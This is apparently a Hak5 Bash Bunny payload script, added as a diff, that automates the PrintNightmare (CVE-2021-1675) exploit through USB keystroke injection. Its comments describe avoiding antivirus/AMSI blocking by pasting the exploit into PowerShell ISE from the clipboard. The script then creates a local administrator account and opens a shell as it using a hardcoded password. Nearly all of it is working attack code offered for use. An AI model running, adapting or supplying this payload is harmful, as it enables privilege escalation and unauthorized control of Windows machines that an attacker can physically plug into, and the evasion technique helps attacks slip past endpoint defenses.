@@ -1,0 +1,79 @@
+#Title:         PrintNightmare
+#Author:        PanicAcid
+#Version:       1.2
+#
+#Leverages the following Powershell script https://github.com/calebstewart/CVE-2021-1675 to invoke the PrintNightmare Vuln and create a local administator account 
+#without bypassing defender or exectuon policy. It aint prudy but it works.
+#
+#Powershell AMSI or whatever it's called kept picking it up and blocking it every time I tried to call the script externally, 
+#even bypassing execution policy seemed to work but the output would always contain 
+#"This script contains malicious content and has been blocked by your antivirus software."
+#
+#However if we run it via PowersShell ISE it works fine. So we're going to type out the whole thing! (Well copy and paste it!)
+#
+#Huge thanks to Cribbit for the clipboard string- without it I would have been typing out the whole thing which when I tried it took FOREVER. 
+#Additionally thanks to Korben and Foxtrot for putting up with my nonsense.
+#
+# NOTE - you may need to tweak the delays a bit, with version 1.0 I took for granted that it ran really fast on my machine which caused 
+# some issues for other folks whereby it'd close the ise window before finishing execution etc. so test and tweak the dealys to your hearts
+# content.
+#
+# Purple.............Loading
+# Green .............Execute
+# Off................Finished
+#
+#!/bin/bash
+
+# OPTIONS - More options available in the Powershell payload
+OBFUSCATECMD="N" # Y=yes or N=no
+
+#-----------------------------------
+# Purple LED - initializing
+LED SETUP
+
+GET SWITCH_POSITION
+DUCKY_LANG gb
+
+# Attackmode HID
+ATTACKMODE HID STORAGE
+
+#-----------------------------------
+# Green LED - executing credential_powershell
+LED STAGE1
+QUACK GUI r
+QUACK DELAY 300
+QUACK STRING powershell.exe
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\juicybit.txt'))"
+QUACK ENTER
+QUACK DELAY 200
+QUACK STRING exit
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell_ise.exe
+QUACK ENTER
+QUACK DELAY 4000
+QUACK CONTROL d
+QUACK CONTROL v
+QUACK CONTROL d
+QUACK ENTER
+QUACK DELAY 3000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING cmd
+QUACK DELAY 150
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING "runas /noprofile /user:Hak5Rules cmd.exe && exit"
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING Hak5Rules
+QUACK DELAY 150
+QUACK ENTER
+
+#-----------------------------------
+# Kill the lights - finished
+LED FINISH
